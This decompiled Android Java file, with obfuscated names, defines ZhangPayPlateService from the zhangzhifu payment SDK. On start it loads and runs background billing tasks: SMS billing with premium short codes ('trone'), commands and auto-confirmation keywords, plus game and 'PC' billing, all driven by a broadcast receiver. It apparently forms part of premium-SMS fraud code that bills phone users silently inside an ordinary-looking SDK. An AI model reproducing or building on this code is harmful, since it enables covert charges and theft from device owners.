package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import com.zhangzhifu.sdk.a.c;
import com.zhangzhifu.sdk.a.e;
import com.zhangzhifu.sdk.b.l;
import com.zhangzhifu.sdk.b.m;
import com.zhangzhifu.sdk.c.f;
import com.zhangzhifu.sdk.util.n;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.List;

public class ZhangPayPlateService
  extends Service
{
  private static boolean j;
  private Handler a = null;
  private ZhangPayPlateService.MyServiceReceiver b;
  private Context c;
  private f d;
  private com.zhangzhifu.sdk.c.b e;
  private List f;
  private List g;
  private List h;
  private List i;
  
  public ZhangPayPlateService() {}
  
  private static void a(List paramList)
  {
    paramList = paramList.iterator();
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      l localL = (l)paramList.next();
      System.out.println("SMSTaskInfo id=" + localL.c() + " feeTimes=" + localL.m() + " trone=" + localL.f() + " command=" + localL.e() + " confirmKeyword=" + localL.i() + " confirmTrone=" + localL.h() + " confirmCommand=");
    }
  }
  
  private void b()
  {
    try
    {
      j = false;
      this.f = com.zhangzhifu.sdk.a.d.a().a(this);
      this.g = com.zhangzhifu.sdk.a.b.a().a(this);
      this.h = c.a().a(this);
      this.i = com.zhangzhifu.sdk.a.a.a().a(this);
      Object localObject1 = e.a().y(this.c);
      System.out.println("支付类型为：" + (String)localObject1);
      if ((localObject1 != null) && (localObject1 != ""))
      {
        if (!m.a)
        {
          n.b("zhangPay_log", "处理短信计费");
          a(this.f);
          localObject1 = new com.zhangzhifu.sdk.util.sms.a(this, this.f);
          if (this.f != null)
          {
            n.b("zhangPay_log", "短信计费生成");
            ((com.zhangzhifu.sdk.util.sms.a)localObject1).a();
          }
        }
        if (!m.c)
        {
          n.b("zhangPay_log", "处理网游计费");
          new com.zhangzhifu.sdk.c.d(this).a(this.g);
        }
        if (!m.f)
        {
          n.b("zhangPay_log", "处理PC计费");
          this.d = new f(this);
          this.d.a(this.h);
        }
        if (!m.d)
        {
          n.b("zhangPay_log", "处理MS网游计费");
          this.e = new com.zhangzhifu.sdk.c.b(this);
          this.e.a(this.i);
        }
      }
      return;
    }
    finally {}
  }
  
  protected void finalize()
  {
    if (this.b != null) {
      unregisterReceiver(this.b);
    }
    super.finalize();
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.c = this;
    this.a = new b(this);
    IntentFilter localIntentFilter = new IntentFilter("zhang.pay.sms.send");
    this.b = new ZhangPayPlateService.MyServiceReceiver(this);
    registerReceiver(this.b, localIntentFilter);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    n.c("zhangPay_log", "fee service start！");
    if (j) {}
    do
    {
      return;
      new a(this).execute(new String[] { "" });
    } while ((m.a) || (m.c) || (m.e) || (m.f) || (m.g) || (m.h));
    boolean bool = m.d;
  }
}
